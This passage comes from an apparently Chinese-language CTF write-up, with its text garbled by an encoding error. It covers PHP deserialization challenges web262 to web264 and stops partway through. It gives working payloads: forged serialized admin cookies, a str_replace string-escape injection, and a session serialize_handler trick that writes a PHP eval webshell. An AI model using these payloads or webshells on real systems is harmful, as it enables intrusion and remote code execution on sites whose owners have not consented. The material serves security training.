class="headerlink" title="web262(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)"></a>web262(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>message.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>æ ¹æ®message.phpæç¤ºï¼ŒCookieä¼ å…¥æ„é€ å¥½çš„msgå³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span></span></code></pre><p>æ­£ç¡®åšæ³•åº”è¯¥æ˜¯è¿ç”¨<strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong>ï¼Œè¿ç”¨çš„æ€æƒ³è·Ÿsqlæ³¨å…¥çš„é—­åˆç›¸ä¼¼</p><p>æˆ‘ä»¬è¿™é‡Œæœ‰ä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¦æ”¹å˜tokenå±æ€§ï¼Œä½†æˆ‘ä»¬æ— æ³•ç›´æ¥æ§åˆ¶å®ƒçš„å€¼ã€‚</p><p>æˆ‘ä»¬åªèƒ½ç»™fromï¼Œmsgï¼Œtoä¼ é€’å€¼ï¼Œå³è¿™ä¸‰ä¸ªå±æ€§æ˜¯å¯æ§çš„</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:1:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre><p>å‡å¦‚æˆ‘ä»¬å‘toå±æ€§ä¼ é€’ <strong>t&#x3D;3â€;s:5:â€tokenâ€;s:5:â€userâ€;}</strong> å­—ç¬¦ä¸²å°±å˜ä¸ºäº†ä¸‹é¢è¿™æ ·</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;user&quot;;&#125;</code></pre><p>æˆ‘ä»¬å¯¹å­—ç¬¦ä¸²è¿›æ¥äº†é—­åˆï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶tokenå±æ€§çš„å€¼äº†ï¼Œä½†æˆ‘ä»¬ä¹Ÿä¼šå‘ç°ä¸€ç‚¹ï¼Œtoå±æ€§å€¼çš„é•¿åº¦å˜ä¸ºäº†27ã€‚</p><p>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœä¸º27åˆ™ä¼šåŒ¹é…åé¢27ä¸ªå­—ç¬¦ï¼Œè¿™æ ·é—­åˆå°±æ²¡æœ‰æ•ˆæœã€‚</p><p>è¿™æ—¶å€™é¢˜ç›®ä¸­çš„æ›¿æ¢å­—ç¬¦å‡½æ•°å¯ä»¥å¸®åŠ©åˆ°æˆ‘ä»¬</p><pre class="language-none"><code class="language-none">$umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code></pre><p>str_replaceä¼šå°†fuckæ›¿æ¢ä¸ºloveUï¼Œä¸”æ›¿æ¢æ˜¯åœ¨åºåˆ—åŒ–ä¹‹åè¿›è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>å®é™…å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†1ï¼Œä½†æ ‡æ˜çš„å­—ç¬¦ä¸²é•¿åº¦ä»»ç„¶ä¸ºåŸå€¼</strong></p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; æ›¿æ¢å‰s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;&#x2F;&#x2F; æ›¿æ¢ås:2:&quot;to&quot;;s:4:&quot;loveU&quot;;</code></pre><p>é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‡­ç©ºå¢åŠ å­—ç¬¦ï¼Œæ¥æˆåŠŸè¿›è¡Œé—­åˆ</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x2F;&#x2F; åé¢å¤šå‡º27ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™27ä¸ªfuckï¼Œæ›¿æ¢ä¸ºloveUåï¼Œå¢åŠ äº†27ä¸ªå­—ç¬¦ï¼Œæ¥è¾¾åˆ°å­—ç¬¦ä¸²é€ƒé€¸</code></pre><p>æœ€ç»ˆæˆ‘ä»¬çš„payloadä¸º</p><pre class="language-none"><code class="language-none">f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h4 id="web263-Sessionååºåˆ—åŒ–"><a href="#web263-Sessionååºåˆ—åŒ–" class="headerlink" title="web263(Sessionååºåˆ—åŒ–)"></a>web263(Sessionååºåˆ—åŒ–)</h4><p>åˆšå¼€å§‹ä»¥ä¸ºå¼±å¯†ç ï¼Œä½†æ˜¯æˆåŠŸï¼Œäºæ˜¯æ‰«æåˆ°å¤‡ä»½æ–‡ä»¶<code>www.zip</code></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"limit"</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>inc.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.serialize_handler'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">...</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">setStatus</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">=</span><span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"log-"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"ä½¿ç”¨"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">.</span><span class="token string double-quoted-string">"ç™»é™†"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">status</span><span class="token operator">?</span><span class="token string double-quoted-string">"æˆåŠŸ"</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"å¤±è´¥"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"----"</span><span class="token operator">.</span><span class="token function">date_create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d H:i:s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>inc.phpæœ‰file_put_contentsï¼Œå¯å†™æœ¨é©¬ï¼Œuseræ§åˆ¶æ–‡ä»¶åï¼Œpasså†™ä¸€å¥è¯</p><pre class="language-php" data-language="php"><code class="language-php">session<span class="token operator">.</span>save_path<span class="token operator">=</span><span class="token string double-quoted-string">""</span> æŒ‡å®šå‚¨å­˜çš„è·¯å¾„session<span class="token operator">.</span>save_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> æŒ‡å®šå‚¨å­˜æ—¶ä½¿ç”¨çš„å‡½æ•°ï¼ˆé»˜è®¤æ˜¯fileï¼‰session<span class="token operator">.</span>auto_start boolensession<span class="token operator">.</span>serialize_handler<span class="token operator">=</span><span class="token string double-quoted-string">""</span> å®šä¹‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å¤„ç†å™¨çš„åå­—ï¼Œé»˜è®¤æ˜¯<span class="token function">php</span><span class="token punctuation">(</span><span class="token number">5.5</span><span class="token number">.4</span>åæ”¹ä¸ºphp_serialize<span class="token punctuation">)</span></code></pre><p>ä½¿ç”¨ <code>ini_set</code> æŒ‡å®šäº† <code>serialize_handler</code> ä¸º <code>php</code>ï¼Œå¦‚æœé»˜è®¤çš„ <code>serialize_handler</code> ä¸º <code>php_serialize</code>ï¼Œå°±å¯ä»¥é€šè¿‡åœ¨åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¹‹å‰åŠ  <code>|</code>ï¼Œååºåˆ—åŒ–ä»»æ„å¯¹è±¡ã€‚</p><ul><li><p>php_binary: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</p></li><li><p>php: å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</p></li><li><p>php_serialize(php&gt;5.5.4): å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼,ä¼šå°†é”®åå’Œå€¼å½“ä½œä¸€ä¸ªæ•°ç»„åºåˆ—åŒ–</p><blockquote><p>æ³¨æ„ï¼šåœ¨ <code>php 5.5.4</code> ä»¥å‰é»˜è®¤é€‰æ‹©çš„æ˜¯ <code>php</code>ï¼Œ<code>5.5.4</code> ä¹‹åå°±æ˜¯ <code>php_serialize</code>ï¼Œè¿™é‡Œçš„ <code>php</code> ç‰ˆæœ¬ä¸º <code>7.3.11</code>ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯ <code>php_serialize</code>ã€‚</p></blockquote></li></ul><p>é‚£ä¹ˆæ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œé¦–å…ˆåœ¨index.phpä¸­çš„ <code>$COOKIE[&#39;limit&#39;]</code> ä¸­æ„é€  <code>|+åºåˆ—åŒ–å¯¹è±¡</code> çš„å­—ç¬¦ä¸²ï¼Œè®¿é—®é¦–é¡µå†™å…¥ <code>session</code>ï¼Œå†é€šè¿‡ <code>check.php</code> åŠ è½½çš„ <code>inc.php</code> ä¸­çš„ <code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code> å°† <code>session</code> ä»¥ <code>session.serialize_handler=php</code> çš„æ ¼å¼ååºåˆ—åŒ–ï¼Œæ‰§è¡Œ <code>User</code> ç±»çš„ <code>__destruct</code> æ–¹æ³•å†™ <code>shell</code>ã€‚<br>æ„é€  <code>payload</code>ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[1]);phpinfo();?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$status</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiJhLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ==</span></span></code></pre><p>è®¿é—®index.phpæ—¶ä¿®æ”¹Cookieå¹¶å‘é€ï¼Œç„¶åè®¿é—®check.phpè§¦å‘ååºåˆ—åŒ–ï¼Œæœ€ååœ¨æ ¹ç›®å½•ä¸‹<code>/log-a.php</code>åˆšå¼€å§‹æ–‡ä»¶æˆåŠŸå†™å…¥äº†ï¼Œæ²¡æ³•å‘½ä»¤æ‰§è¡Œï¼Œæœ¨é©¬åé¢åŠ ä¸ª<code>phpinfo()</code>å°±å¯ä»¥äº†ï¼Œå¾ˆå¥‡æ€ª</p><h4 id="web264-Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸"><a href="#web264-Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸" class="headerlink" title="web264(Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸)"></a>web264(Sessionååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>è¿™æ¬¡ç›¸æ¯” <code>web262</code> æœ‰äº† <code>session</code> çš„é™åˆ¶ï¼Œå°±ä¸èƒ½è‡ªå·±æ„é€ äº†ï¼Œç”¨èµ·æ¥ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span> <span class="token operator">=</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";&#125;'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> 